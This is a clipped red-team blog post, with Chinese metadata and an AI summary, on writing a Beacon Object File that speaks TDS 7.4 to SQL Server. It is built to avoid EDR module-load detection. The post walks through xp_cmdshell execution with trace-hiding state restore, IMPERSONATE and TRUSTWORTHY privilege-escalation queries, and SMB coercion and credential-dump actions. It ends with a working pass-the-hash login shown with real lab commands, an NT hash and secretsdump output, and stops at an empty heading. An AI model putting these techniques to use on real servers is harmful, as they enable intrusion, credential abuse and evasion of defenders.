---
title: Writing a TDS 7.4 BOF for SQL Server, all the way to Pass-the-Hash | Mohamed Alzhrani
source: https://0xmaz.me/posts/Writing-a-TDS-7.4-BOF-for-SQL-Server-all-the-way-to-Pass-the-Hash/
source_host: 0xmaz.me
clip_date: 2026-10-05T10:17:08+08:00
trace_id: 9e4d4ae2-2337-4fb5-8a0f-7cabcd292e2e
content_hash: d3cc7d2b4d20f8d78a21eb01de0390bf4805638d9ea9ea9bbdb9ed9275856558
status: synced
tags:
  - 协议分析
  - 网络工具
series: null
feed_source: 0xMaz·Windows驱动/AD
ai_summary: 直接以 C 语言 BOF 手写 TDS 7.4 协议客户端，不加载任何微软 SQL 客户端 DLL，并据此实现无需 lsass 的 Pass-the-Hash 登录 SQL Server。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3f075244-d011-81a3-881f-c59349902145
ioc:
  cves: []
  cwes: []
  hashes:
    - "00000000000000000000000000000000"
    - aad3b435b51404eeaad3b435b51404ee
    - e19ccf75ee54e06b06a5907af13cef42
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 直接以 C 语言 BOF 手写 TDS 7.4 协议客户端，不加载任何微软 SQL 客户端 DLL，并据此实现无需 lsass 的 Pass-the-Hash 登录 SQL Server。
> 
> - **核心约束：** 执行任一 action 前后 beacon 的已加载模块列表必须完全一致，因此只能用已存在的 kernel32、ws2_32、schannel、secur32、bcrypt 等 DLL，否则触发 EDR 模块加载回调。
> - **TLS 怪癖：** TLS 握手记录被包在 TDS PRELOGIN（0x12）包内传输；首个 LOGIN7 以 TLS 应用数据加密发出后，服务器明文回包，后续 SSPI 续包也必须改为明文，否则连接被 RST。
> - **续包解析：** 响应循环不能以 DONE 令牌为结束条件，必须按 TDS 头的 EOM 标志终止——0xED SSPI CHALLENGE 响应只有一个令牌、没有 DONE，否则与服务器互相等待而超时。
> - **PTH 关键点：** 放弃 SSPI，用 BCrypt 自算 NTLMv2；必须提交真实 LMv2 响应（实填 24 个零字节会失败），且 NegotiateFlags 需只镜像 Type 2 请求的能力（去掉 KEY_EXCH、SIGN、ALWAYS_SIGN）。
> - **功能与提权：** 统一分发 11 个 action（find、info、query、links、exec、impersonate、privesc、coerce、passwords、chain）；exec 对 xp_cmdshell 做启用-运行-恢复状态机；非 sysadmin 时走 IMPERSONATE 授权或 TRUSTWORTHY 库两条路径；已知遗留 bug 是多腿登录后首个 SQLBatch 数据损坏，靠 primer SELECT 加 BeaconPrintf 规避。

Every red team engagement I have ever been on has walked into a Microsoft SQL Server at some point. HR systems, ticketing backends, CMDBs, finance, inventory — any of them. It is, after SMB, the second most useful lateral movement target in the average enterprise, and it is the one where the gap between offensive tooling and defensive detection has been the widest for years.

The tools people reach for today are `SQLRecon`, `PowerUpSQL`, and whatever wraps `sqlcmd.exe`. The first loads `clr.dll` + `mscoree.dll` + `System.Data.SqlClient` into your beacon. The second lights up AMSI the second the module manifest parses. The third writes a file to disk and then launches it as a child of your beacon host, which shows up in every process-tree telemetry pipe your defender has. None of these are subtle.

The root cause is that nobody wanted to implement TDS by hand. TDS 7.4 is the protocol SQL Server speaks on the wire, `[MS-TDS]` is 400 pages, and the reference implementations are all CLR-based. But the moment you read the spec long enough to realize it is just framed bytes over TCP with a Schannel handshake in front, the whole thing becomes a weekend-and-a-half project. So I took it on: [**mssqlbof**](https://github.com/MazX0p/mssqlbof), a Beacon Object File that speaks TDS 7.4 directly, in C, without loading a single line of Microsoft’s ODBC or.NET stack into the beacon.

This post is about how it got built, in order: PRELOGIN, TLS, LOGIN7, SQL auth, the token parser, SSPI, multi-leg NTLM, the unified action dispatcher, and finally the one every operator actually wants — pass-the-hash. Every section comes with the bugs I hit and the fix that shipped. If you only want to read about PTH, it is at the bottom, but the TLS and NTLM quirks I hit getting there are useful on their own.

## The target: zero new DLLs in the beacon

The constraint I set before writing a line of code was: **a mssqlbof beacon’s loaded module list after running any action must be indistinguishable from the same beacon’s loaded module list before**. Not close. Identical. That ruled out `msodbcsql17.dll`, `msodbcsql18.dll`, `sqloledb.dll`, `sqlncli.dll`, `mscoree.dll`, `clr.dll`, `mscorlib.ni.dll`, and every other SQL-client DLL Microsoft ships. Every one of those is a signature.

What you can use freely are the DLLs already in every beacon address space: `kernel32`, `advapi32`, `ws2_32`, `wldap32`, `secur32`, `schannel`, `bcrypt`, `crypt32`, `msvcrt`. That is the entire tool palette. If you cannot do something with those, you do not do it.

TDS itself needs nothing more than `ws2_32` for the socket. The interesting parts are the TLS layer (`schannel` + `crypt32`), SSPI (`secur32` for Kerberos/NTLM token issuance), and BCrypt (for the NTLMv2 HMAC-MD5 in the pass-the-hash path). All three are already loaded. No new module loads means nothing for an EDR module-load hook to trigger on.

## The TDS 7.4 packet, in 15 lines of C

TDS is an 8-byte header followed by a payload, chunked into packets. The header is the simplest part of the whole protocol:

```c
#pragma pack(push, 1)
typedef struct {
    uint8_t  type;      // 0x01 SQLBatch, 0x04 TABULAR, 0x10 LOGIN7,
                        // 0x11 SSPI, 0x12 PRELOGIN
    uint8_t  status;    // bit 0 = EOM (end of message)
    uint16_t length;    // big-endian, total packet size incl. header
    uint16_t spid;
    uint8_t  packet_id;
    uint8_t  window;
} tds_header_t;
#pragma pack(pop)
```

Payloads larger than the negotiated packet size get split across multiple TDS packets; the last one has `EOM=1`. Every response from the server follows the same rule, and every well-implemented TDS client has to reassemble based on that flag. (This turns out to matter enormously for NTLM continuation — more on that later.)

## Step 1: PRELOGIN

The first thing you send is a PRELOGIN (type `0x12`). It is a list of optional tokens — version, encryption capability, instance name, thread id, MARS — terminated by `0xFF`. Here is a minimum-viable PRELOGIN, annotated:

```javascript
12 01 00 26 00 00 01 00    // header: PRELOGIN, EOM, len 38, spid 0
00 00 15 00 06             // VERSION token, offset 0x0015, len 6
01 00 1B 00 01             // ENCRYPTION token, offset 0x001B, len 1
02 00 1C 00 01             // INSTOPT token, offset 0x001C, len 1
03 00 1D 00 04             // THREADID token, offset 0x001D, len 4
04 00 21 00 01             // MARS token, offset 0x0021, len 1
FF                         // terminator
09 00 63 45 00 00          // version payload: 9.0.25445
02                         // encryption payload: ENCRYPT_NOT_SUP (0x02)
00                         // instopt: empty
00 00 00 00                // threadid
00                         // MARS off
```

You send that, the server answers with its own PRELOGIN + chosen encryption level, and you now know whether to run TLS. That byte at offset `0x001B` in the response is the only one that matters for the handshake decision: `0x00` (off), `0x01` (on), `0x02` (not supported), or `0x03` (required).

## Step 2: the TLS handshake, wrapped inside TDS PRELOGIN

Here is the first SQL Server quirk that breaks every naive implementation. When TLS is on, the handshake records are **not** sent as raw TLS over TCP. They are wrapped inside `TDS_TYPE_PRELOGIN` (`0x12`) packets. The client generates a ClientHello via Schannel, stuffs it into the payload of a PRELOGIN packet, sends it. The server replies with a ServerHello wrapped in the same way. This goes back and forth until the handshake finishes.

The loop on the client side looks like this, in pseudocode:

```rust
InitializeSecurityContextW(..., NULL, 0, ...) -> out_token
loop:
    wrap out_token in TDS PRELOGIN packet
    send to server
    recv TDS PRELOGIN packet
    in_token = payload of that packet
    InitializeSecurityContextW(ctx, in_token, len, ...) -> out_token
    if SEC_E_OK: break
    if SEC_I_CONTINUE_NEEDED: continue
    else: fail
```

That is `src/tds/tls_schannel.c`. The fact that the handshake lives inside TDS framing and not over raw TCP is the reason you cannot just point OpenSSL at the socket and let it run. Schannel happens to give you the exact primitive — ISC with in/out buffers — and so does OpenSSL for that matter (`SSL_read` / `SSL_write` with a BIO pair), but either way you are doing the transport wrapping yourself.

Once the handshake finishes, the model flips. The next thing the client sends is LOGIN7, **encrypted as raw TLS application data**, not wrapped in a PRELOGIN. And the server answers **in plaintext** because the login is the only thing it wanted encrypted. That is the login-phase asymmetry.

I would love to tell you this is documented somewhere in `[MS-TDS]`. It is not. I figured it out by diffing a working Wireshark capture of `sqlcmd` against my failing one. The relevant state machine in the BOF:

```c
// After Schannel handshake succeeds:
c->tls_send_state = TDS_TLS_STATE_RAW_TLS;   // encrypt on send
c->tls_recv_state = TDS_TLS_STATE_NONE;      // plaintext on recv

// After LOGIN7 is acknowledged:
c->tls_send_state = TDS_TLS_STATE_NONE;      // plaintext both ways
c->tls_recv_state = TDS_TLS_STATE_NONE;
tds_tls_free(c);                              // release Schannel context
```

Get that wrong in either direction and you get the world’s most baffling error: Schannel `DecryptMessage` fails with `SEC_E_DECRYPT_FAILURE` on the first byte of a perfectly valid server response. Which, for the record, is not a helpful error.

## Step 3: LOGIN7

LOGIN7 (type `0x10`) is where the client identifies itself. Its layout is a 36-byte fixed header, a 58-byte offset/length table, and then a packed string payload. The offset/length table has an entry for every variable-length field — hostname, username, password, app name, server name, client interface name, language, database, SSPI blob, attached DB file, change-password request, and a long-form SSPI length.

Two things in LOGIN7 matter specifically for this post: the `OptionFlags2` byte and the SSPI field.

```c
pkt[25] = use_sspi ? 0x80 : 0x00;  // bit 7 = fIntSecurity
```

`fIntSecurity` set means “I’m using Windows authentication; the SSPI field contains the token.” Clear means “I’m using SQL authentication; look at the username and password fields.” If you clear the bit and fill in the username/password fields, you have SQL auth working. If you set the bit and fill in the SSPI field, you have Windows auth — which gets you into SSPI territory.

And the password field, because SQL Server committed to security theater in 2000 and never walked it back, is obfuscated with a nibble-swap + XOR 0xA5 per byte:

```c
static void password_obfuscate(uint8_t *buf, size_t bytes) {
    for (size_t i = 0; i < bytes; ++i) {
        uint8_t b = buf[i];
        buf[i] = (uint8_t)(((b >> 4) | (b << 4)) ^ 0xA5);
    }
}
```

This is not encryption. It is trivially reversible. It was a wire format gesture in 2000 when nobody had TLS, and now it lives inside a TLS tunnel anyway, so it is purely historical. You still have to do it or SQL Server rejects the login.

## Step 4: the token stream

The server’s response to LOGIN7 comes back as a TABULAR packet (type `0x04`) carrying a **token stream**— a sequence of typed records. Each token starts with a 1-byte type, and the shape of the rest depends on the type. `[MS-TDS]` §2.2.7 has the grammar.

The handful of tokens a BOF actually needs to parse:

| Token | Byte | Shape |
| --- | --- | --- |
| `LOGINACK` | `0xAD` | USHORT len + interface/version/progname |
| `ERROR` | `0xAA` | USHORT len + number/state/class + USHORT msglen + UTF-16 msg + server + proc + line |
| `INFO` | `0xAB` | same shape as ERROR |
| `ENVCHANGE` | `0xE3` | USHORT len + type + old/new value |
| `DONE` / `DONEPROC` / `DONEINPROC` | `0xFD/FE/FF` | 12 bytes: status(2) curcmd(2) rowcount(8) |
| `COLMETADATA` | `0x81` | count + per-column: usertype flags type-specific |
| `ROW` | `0xD1` | one cell per COLMETADATA column |
| `NBCROW` | `0xD2` | null bitmap + cells for non-null columns |
| `ORDER` | `0xA9` | USHORT len + payload |
| `RETURNSTATUS` | `0x79` | 4 bytes |
| `SSPI` | `0xED` | USHORT len + NTLMSSP payload (continuation) |

My parser lives in `src/tds/tokens.c:tds_parse_response`. It walks tokens in order, dispatches on type, fills in a `tds_result_t` struct for COLMETADATA + ROW + NBCROW, and captures error text into `conn->last_error` for ERROR tokens. There is one thing I got wrong the first time, and it matters so much I want to call it out here instead of in the NTLM section where I actually hit it: **the loop termination was based on seeing a DONE token**. That worked for every query response you can imagine. It failed spectacularly for SSPI continuation responses, which contain exactly one `0xED` token and zero DONE tokens. I will come back to this.

## Step 5: cells

Each COLMETADATA entry tells you the type of its column, and ROW/NBCROW packs the cells in column order. The cell format depends on the column’s type class:

-   **Fixed** (INT1/INT2/INT4/INT8, BIT, DATETIME, FLT4/FLT8): raw bytes, no length prefix.
-   **Byte-len** (INTN, BITN, FLTN, GUID, DATEN, TIMEN, DATETIMN, DECIMALN): 1-byte length, then data.
-   **USHORT-len char** (BIGCHAR, BIGVARCHAR, NCHAR, NVARCHAR): 2-byte length, then data. Length `0xFFFF` means NULL.
-   **USHORT-len bin** (VARBINARY, BINARY, BIGBINARY, BIGVARBINARY): same shape.
-   **Long-len** (TEXT, NTEXT, IMAGE): 1-byte text pointer length, text pointer, 8-byte timestamp, 4-byte data length, then data.

For NBCROW, there is an extra null bitmap up front — `(n_cols + 7) / 8` bytes — and you skip the actual bytes of any column whose null bit is set.

The decode logic is around 200 lines of C in `src/tds/tokens.c` and `src/tds/result.c` combined. I support the types I needed for the introspection queries (`sys.databases`, `sys.servers`, `sys.server_principals`, `sys.configurations`, `sys.server_permissions`) plus the common data types for `--action query`. Anything I do not handle decodes to a `<unsupported>` placeholder rather than corrupting the row.

## Step 6: SQL auth and the first working query

With PRELOGIN, Schannel, LOGIN7, and the token parser all in place, SQL authentication is the easy path. You skip SSPI entirely, fill in the username and password fields in LOGIN7 (with the obfuscation dance), clear the `fIntSecurity` bit, and send the packet. Here is what that looks like on the wire, captured against the lab SQL Server 2019:

```rust
1  0.000000  client -> sql    TCP 74 50041 -> 1433 [SYN]
 2  0.000614  sql    -> client TCP 66 [SYN, ACK]
 3  0.000826  client -> sql    TCP 60 [ACK]
 4  0.001114  client -> sql    TDS 106 TDS7 pre-login
 5  0.001389  sql    -> client TDS 91  Response (PRELOGIN)
 6  0.002239  client -> sql    TLSv1  Client Hello (wrapped in TDS)
 7  0.003158  sql    -> client TLSv1  Server Hello, Cert, Done
 8  0.004630  client -> sql    TDS    Client Key Exchange
 9  0.005482  sql    -> client TLSv1  Change Cipher Spec, Finished
10  0.007297  client -> sql    TLSv1  Application Data (LOGIN7)
11  0.007555  sql    -> client TDS    Response (LOGINACK plaintext)
12  0.007878  client -> sql    TDS    SQL batch: SELECT @@VERSION
13  0.010012  sql    -> client TDS    Response: version row
```

Eleven packets from SYN to `@@VERSION`. Works first try. If you have ever implemented a real protocol client this is an oddly pleasant feeling — the plan worked, the reference captures matched, no time was lost.

## Step 7: SQLBatch and the ALL_HEADERS quirk

Sending T-SQL from the client uses `TDS_TYPE_SQLBATCH` (`0x01`). The TDS 7.4 version of this packet has a required `ALL_HEADERS` prefix — 22 bytes of transactional metadata — that you have to prepend before the SQL text. The shape is:

```javascript
04 00 00 00                     // ALL_HEADERS total length (22)
12 00 00 00                     // header length (18)
02 00                           // header type = transaction descriptor
00 00 00 00 00 00 00 00         // transaction descriptor (0)
01 00 00 00                     // outstanding request count (1)
<utf-16le sql text follows>
```

Without that prefix the server answers with `Incorrect syntax near ''.` — not the most helpful error I have ever received. With it, you can send arbitrary T-SQL and parse the response through the same token stream as the login response.

## Step 8: SSPI for Windows authentication

SQL auth is fine in a pinch, but the interesting path is Windows auth, which means SSPI. The operator has a beacon thread token — either the original one it inherited when it injected, or a token produced by `make_token` or `steal_token`. If that token has a Kerberos TGT or is a domain member that can reach the DC, we can authenticate to SQL Server without touching any plaintext passwords.

The SSPI dance in one screen:

```c
AcquireCredentialsHandleW(
    NULL,               // principal: use thread token
    L"Negotiate",       // package: auto-picks Kerberos or NTLM
    SECPKG_CRED_OUTBOUND,
    NULL, NULL, NULL, NULL,
    &hCred, NULL);

InitializeSecurityContextW(
    &hCred, NULL,
    L"MSSQLSvc/sql01.corp.local:1433",   // SPN
    ISC_REQ_CONNECTION | ISC_REQ_ALLOCATE_MEMORY,
    0, 0,
    NULL, 0,            // no input token on first call
    &hCtxt, &out_desc, &out_flags, NULL);
```

`out_desc.pBuffers[0]` now contains a binary blob — the NTLMSSP NEGOTIATE message or the Kerberos AP-REQ, depending on what the Negotiate package picked. You drop that blob into the SSPI field of LOGIN7, set `fIntSecurity`, and send the login.

For Kerberos against a known-good SPN, the server responds with `LOGINACK` + `DONE` on the first round trip and you are done. For NTLM, it responds with a `TDS_TOK_SSPI` (`0xED`) token containing an NTLMSSP CHALLENGE, and you need to pump the state machine for another round. That is the multi-leg pump.

## Step 9: the multi-leg pump, and the EOM bug

For NTLM, the handshake takes three messages. Client sends NEGOTIATE (Type 1), server replies with CHALLENGE (Type 2), client replies with AUTHENTICATE (Type 3), server replies with LOGINACK. Four packets. In TDS terms:

```haskell
client                                 server
------                                 ------
  |                                       |
  | LOGIN7 [TLS app data]                 |
  | SSPI field = NTLMSSP Type 1 NEGOTIATE |
  | ------------------------------------> |
  |                                       |
  | TABULAR [plaintext]                   |
  | contains TDS_TOK_SSPI (0xED)          |
  | payload = NTLMSSP Type 2 CHALLENGE    |
  | <------------------------------------ |
  |                                       |
  | SSPI packet (type 0x11) [plaintext]   |
  | payload = NTLMSSP Type 3 AUTHENTICATE |
  | ------------------------------------> |
  |                                       |
  | TABULAR [plaintext]                   |
  | LOGINACK + ENVCHANGE + DONE           |
  | <------------------------------------ |
```

The first time I ran this against the lab, the BOF hung on the second recv, sat there for 15 seconds (the SO_RCVTIMEO I’d set for exactly this reason), and returned `recv() failed or eof`. A tcpdump on the Proxmox bridge showed the CHALLENGE packet arriving from the server immediately and then nothing. Client and server both silent. Something was wrong on my side.

The something was this. My response parser was terminating the recv loop based on seeing a DONE token — the one I warned you about above. The 0xED CHALLENGE response from SQL Server contains exactly one token — the `0xED` — and zero DONE tokens. So my loop was calling `tds_packet_recv` a second time, waiting for “more data to find a DONE in,” and the server was waiting for me to answer the challenge. Classic deadlock, written by me, against myself.

The fix was honoring the `EOM` flag in the TDS packet header:

```c
// Honor the TDS EOM flag from the packet header. Critical for SSPI
// continuation responses which contain only a 0xED token and NO DONE
// token: without this break we'd loop forever waiting for a DONE that
// never comes.
if (c->rx_status & TDS_STATUS_EOM) break;
```

Three lines, ships in every TDS implementation that matters, should have been there from the start.

## Step 10: the second gotcha — TLS on continuation packets

Fixing the EOM bug got me a clean CHALLENGE in hand. I fed it back into `InitializeSecurityContextW`, got an AUTHENTICATE Type 3 out, wrapped it in a `TDS_TYPE_SSPI` (`0x11`) packet, and sent it. The server’s response was… nothing. A TCP RST a few seconds later.

This is where the login-phase asymmetry I mentioned earlier bites a second time. My send path was still in `TDS_TLS_STATE_RAW_TLS` because the first LOGIN7 went out encrypted. Schannel happily encrypted the SSPI continuation as a TLS application data record and shipped it. The SQL Server side of the conversation had already ended its TLS session after decrypting the first LOGIN7. It saw what it thought was random bytes on the wire, gave up, closed the connection.

The fix is to drop `tls_send_state` to NONE after sending the first LOGIN7, before the SSPI continuation pump runs:

```c
// After the first LOGIN7 is sent encrypted, SQL Server's
// asymmetric login-only TLS quirk means subsequent SSPI
// continuation packets must be sent PLAINTEXT -- the server only
// decrypts the initial LOGIN7.
if (c->tls_send_state != TDS_TLS_STATE_NONE) {
    c->tls_send_state = TDS_TLS_STATE_NONE;
}
```

Two pages of spec in `[MS-TDS]` talking about TLS, and the login-phase asymmetry does not come up once. You figure it out with Wireshark or you do not figure it out.

## Step 11: the unified BOF and the 11 actions

By this point I had a working TDS client, two auth modes (SQL and SSPI), and a separate BOF for each verb — `mssql_find`, `mssql_info`, `mssql_query`, `mssql_links`, `mssql_exec`, `mssql_impersonate`. Shipping six object files felt wrong the first time I found myself squinting at the build output trying to remember which one was the `xp_cmdshell` one. So I collapsed everything into a single `mssql.x64.o` that dispatches on `--action <verb>`.

The unified BOF now does eleven things:

-   `find` — LDAP enum of `MSSQLSvc` SPNs via `wldap32`, no SQL connection
-   `info` — version, edition, current user, sysadmin, current DB
-   `query` — arbitrary T-SQL
-   `links` — `sys.servers` enum
-   `exec` — `xp_cmdshell` with an auto enable-run-restore state machine
-   `impersonate` — `EXECUTE AS LOGIN` wrapper with `--discover` mode
-   `privesc` — six-section surface enumeration (more below)
-   `coerce` — `xp_dirtree` SMB auth coercion for NetNTLMv2 capture
-   `passwords` — dump `sys.linked_logins` + `sys.credentials`
-   `chain` — `EXEC ('...') AT [link]` for linked-server pass-through

`find` is the only one that does not touch TDS. Everything else shares the connect path, which means everything else also gets the new auth modes for free when I add them.

## Step 12: xp_cmdshell state machine for exec

`exec` is the loudest action and also the one that needs the most careful handling. The default state of `xp_cmdshell` on a fresh SQL Server is disabled. Enabling it requires `sp_configure 'show advanced options', 1` + `RECONFIGURE`, then `sp_configure 'xp_cmdshell', 1` + `RECONFIGURE`. Running it is a single `EXEC xp_cmdshell '<cmd>'`. Restoring the prior state is another two `sp_configure` calls.

The state machine I landed on:

```bash
read   state of 'show advanced options'     -> save A
read   state of 'xp_cmdshell'                -> save B
if !A: set 'show advanced options' = 1 + RECONFIGURE
if !B: set 'xp_cmdshell' = 1 + RECONFIGURE
run    EXEC xp_cmdshell '<cmd>'
if !B: set 'xp_cmdshell' = 0 + RECONFIGURE
if !A: set 'show advanced options' = 0 + RECONFIGURE
```

With `--no-restore`, the last two lines are skipped. The default is to restore, because leaving `xp_cmdshell = 1` behind you on a SQL Server that started with it disabled is a bright red trail any competent defender will follow.

## Step 13: privesc without sysadmin

`xp_cmdshell` needs sysadmin. The interesting question is what you do when your authenticating login is not sysadmin. In a well-configured environment it often is not — maybe the operator is running as a service account that only has read access to an application database. But SQL Server is full of paths between “I can log in” and “I am sysadmin.”

`mssqlbof` handles this through an `--impersonate` mode on `--action exec` that tries two paths before giving up:

**Path 1: `EXECUTE AS LOGIN` via an IMPERSONATE grant.** `sys.server_permissions` has a row per explicit IMPERSONATE grant. If your login has `IMPERSONATE` on another login that happens to be sysadmin, you can `EXECUTE AS LOGIN = 'victim'` and run your command in their context. The query to find this is:

```sql
SELECT b.name, ISNULL(IS_SRVROLEMEMBER('sysadmin', b.name), 0) AS is_sa
FROM   sys.server_permissions a
JOIN   sys.server_principals b
       ON a.grantor_principal_id = b.principal_id
WHERE  a.permission_name = 'IMPERSONATE'
  AND  a.state IN ('G','W')
ORDER BY CASE WHEN b.name = 'sa' THEN 0
              WHEN is_sa = 1    THEN 1
              ELSE 2 END, b.name
```

That gives you the list sorted by “sa first, then other sysadmins, then everything else.” Pick the first one, `EXECUTE AS LOGIN = 'sa'`, run `xp_cmdshell`, `REVERT` when you are done.

**Path 2: TRUSTWORTHY database hop.** A database with `TRUSTWORTHY ON` that is owned by a sysadmin is a privesc primitive by itself. If your login can access that database and the database’s `dbo` user is effectively a sysadmin, you can `USE` the database and inherit that context. The query:

```sql
SELECT d.name
FROM   sys.databases d
LEFT JOIN sys.server_principals sp ON d.owner_sid = sp.sid
WHERE  d.is_trustworthy_on = 1
  AND  d.state <> 3
  AND  (ISNULL(IS_SRVROLEMEMBER('sysadmin', sp.name), 0) = 1
        OR ISNULL(IS_SRVROLEMEMBER('sysadmin', SUSER_SNAME(d.owner_sid)), 0) = 1)
ORDER BY CASE WHEN d.database_id > 4 THEN 0 ELSE 1 END, d.name
```

User databases first (`database_id > 4`), then system databases, skipping `msdb` if you can. There are a surprising number of production SQL Servers where somebody enabled TRUSTWORTHY on a custom application database as a quick fix to an access problem and never turned it off.

The dispatcher tries Path 1, falls back to Path 2, and gives up if both fail. There is also a separate `--action privesc` that just enumerates the surface without trying anything — six sections covering sysadmin membership, IMPERSONATE grants, TRUSTWORTHY databases, linked servers, server-level permissions, and `xp_cmdshell` state. Run that first when you want to see your options, then pick a method explicitly.

## Step 14: pass-the-hash

Which brings us to the one you came here for. The question on the table is: can a BOF authenticate to SQL Server using just an NT hash, without touching `lsass.exe`?

`AcquireCredentialsHandleW` takes either `NULL` (the current thread token) or a `SEC_WINNT_AUTH_IDENTITY_W` filled with a plaintext username and password. The NTLM provider derives the NT hash internally. There is no documented way to hand it a hash that it will use as-is. Mimikatz `sekurlsa::pth` works around this by patching `lsass.exe` at runtime, which is the opposite of what you want from a BOF — a BOF lives for a few hundred milliseconds on a beacon thread and is gone.

The clean path — the one Impacket takes, and `ntlmrelayx`, and every other client-side PTH tool worth using — is to ignore SSPI entirely and build the NTLMSSP messages yourself. Type 1 NEGOTIATE, Type 2 CHALLENGE parse, NTLMv2 response computation, Type 3 AUTHENTICATE. A BOF has access to `bcrypt.dll`, which means HMAC-MD5 is three calls, which means you already have everything you need.

### The NTLMv2 math

`[MS-NLMP]` §3.3.2 specifies the response computation. In pseudocode:

```javascript
NTLMv2Hash  = HMAC_MD5(NTHash, UPPER(user) || domain)      // UTF-16LE

temp        = 0x01 0x01 0x00 0x00 0x00 0x00 0x00 0x00
              || timestamp(8)            // FILETIME little-endian
              || clientChallenge(8)      // random 8 bytes
              || 0x00 0x00 0x00 0x00
              || serverTargetInfo        // verbatim from Type 2
              || 0x00 0x00 0x00 0x00

NTProofStr  = HMAC_MD5(NTLMv2Hash, serverChallenge || temp)
NTLMv2Resp  = NTProofStr || temp         // goes in Type 3 NtChallengeResponse
```

The LMv2 companion is almost the same:

```
LMv2Resp    = HMAC_MD5(NTLMv2Hash, serverChallenge || clientChallenge)
              || clientChallenge
```

The only per-call randomness is the 8-byte client challenge. Everything else is derived. And the data flow — what ingredients go where — is straightforward once you draw it:

```haskell
NT hash        User         Domain
(16 bytes)     (UTF-16LE)   (UTF-16LE)
    \            /             /
     \          /             /
       +------v------+
       |  HMAC-MD5   |<-------+
       +------+------+
              |
              v
         NTLMv2 hash                  server challenge
        (session key)                   (from Type 2)
              |                                |
              |                +---------------+
              |                |
              v                v
       +-------------------------+
       |  HMAC-MD5  (serverCh || |
       |             temp)       |
       +------------+------------+
                    |
                    v
               NTProofStr (16)
                    |
                    +----> || temp ---> Type 3 NtChallengeResponse
                    |
                    +----> + clientCh -> Type 3 LmChallengeResponse
```

HMAC-MD5 via BCrypt is four calls wrapped in a helper:

```c
BCryptOpenAlgorithmProvider(&hAlg, L"MD5", NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
BCryptCreateHash(hAlg, &hHash, NULL, 0, key, keylen, 0);
BCryptHashData(hHash, data, datalen, 0);
BCryptFinishHash(hHash, out, 16, 0);
BCryptDestroyHash(hHash);
BCryptCloseAlgorithmProvider(hAlg, 0);
```

`bcrypt.dll` is already loaded in every Windows process because Schannel needs it, so these resolve without dragging any new DLLs into the beacon.

### The first attempt

With the code in place — `ntlm_pth_build_type1`, `parse_type2`, `ntlm_pth_build_type3` — the first test run looked like this:

```sql
my> execute bof mssql.x64.o --action info --host 192.168.0.122 \
    --auth ntlm --domain SILENTSTRIKE --user Administrator \
    --hash e19ccf75ee54e06b06a5907af13cef42
[!] connect failed (-5): Login failed. The login is from an untrusted
    domain and cannot be used with Integrated authentication.
```

The interesting thing about that error is that it is **not** a TDS transport failure. The server parsed our Type 3 all the way to the point where it asked the DC “does this NTLMv2 response actually come from SILENTSTRIKE\\Administrator with her NT hash,” and the DC said no. So either the hash was wrong, or the math was wrong, or the framing was wrong.

The hash was fine:

```
$ impacket-secretsdump 'Administrator:P@ssw0rd@192.168.0.122' | grep Administrator
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
```

And the same hash against the same server through `mssqlclient.py -hashes` worked first try. So the difference was in what I was putting on the wire, not in what the server would accept in principle.

### Diffing against Impacket

The cleanest way to find the bug was to capture Impacket doing the thing right next to us doing it wrong, and diff the Type 3 message byte-for-byte.

```bash
$ tcpdump -i vmbr0 -nn -s0 -w /tmp/impk.pcap 'host 192.168.0.122 and port 1433' &
$ mssqlclient.py -hashes :e19ccf75ee54e06b06a5907af13cef42 \
    'SILENTSTRIKE/Administrator@192.168.0.122' -windows-auth <<< 'exit'
```

Pulling the NTLMSSP AUTH packet out of the capture:

```yaml
$ tshark -r /tmp/impk.pcap -Y 'frame.number==14' -T fields -e tcp.payload \
    | xxd -r -p | xxd | head
00000000: 1101 01c2 0000 0100 4e54 4c4d 5353 5000  ........NTLMSSP.
00000010: 0300 0000 1800 1800 8a00 0000 1801 1801  ................
00000020: a200 0000 1800 1800 5800 0000 1a00 1a00  ........X.......
00000030: 7000 0000 0000 0000 8a00 0000 0000 0000  p...............
00000040: ba01 0000 0502 88a2 0a00 7c4f 0000 000f  ..........|O....
00000050: bcb7 60fb e569 d460 6aee 8375 87e9 5bc8  ..`..i.`j..u..[.
```

Two things jumped out.

**The LMv2 response field was not zeroed.** Every NTLMv2 reference I had read said “the LMv2 response is optional for NTLMv2 sessions, 24 zero bytes is acceptable.” I had dutifully written 24 zero bytes into that field. Impacket was writing a real LMv2 computation. SQL Server apparently disagreed with every reference I had read — either that, or the Win32 implementations all followed the spec so religiously that they forgot to handle the “optional” case, and the DC-side validator treats a zero LMv2 as malformed. Either way, you need a real LMv2 response.

**The NegotiateFlags were different.** I was sending `0xe2888215`. Impacket was sending `0xa2880205`. Specifically, I had `KEY_EXCH`, `SIGN`, and `ALWAYS_SIGN` set. Impacket did not. The only flags Impacket set were:

```
NTLMSSP_NEGOTIATE_UNICODE              0x00000001
NTLMSSP_REQUEST_TARGET                 0x00000004
NTLMSSP_NEGOTIATE_NTLM                 0x00000200
NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSEC  0x00080000
NTLMSSP_NEGOTIATE_TARGET_INFO          0x00800000
NTLMSSP_NEGOTIATE_VERSION              0x02000000
NTLMSSP_NEGOTIATE_128                  0x20000000
NTLMSSP_NEGOTIATE_56                   0x80000000
                                      -----------
                                       0xa2880205
```

I had originally picked my flag set by reading the MS-NLMP examples. Every `[MS-NLMP]` example I had found listed the full “modern session security” flag set, and I had copied it. It turns out SQL Server’s validator is sensitive to flags it did not ask for in the Type 2 CHALLENGE — it wants you to mirror back only the capabilities you are going to use. `KEY_EXCH` and `SIGN` are a promise that subsequent traffic will be signed, which we are not going to do, which invalidates the whole message from the server’s perspective.

Swapping to Impacket’s flag set and computing a real LMv2 response produced:

```css
my> execute bof mssql.x64.o --action info --host 192.168.0.122 \
    --auth ntlm --domain SILENTSTRIKE --user Administrator \
    --hash e19ccf75ee54e06b06a5907af13cef42
[*] connected as SILENTSTRIKE\Administrator @ SRV02\SQLEXPRESS
Server         : SRV02\SQLEXPRESS
Version        : 15.0.2000.5 (Express Edition (64-bit))
Current user   : SILENTSTRIKE\Administrator
Is sysadmin    : YES
```

And `--hash 00000000000000000000000000000000` cleanly fails with the same `untrusted domain` error — which gives you a negative test for free.

## What it looks like end to end

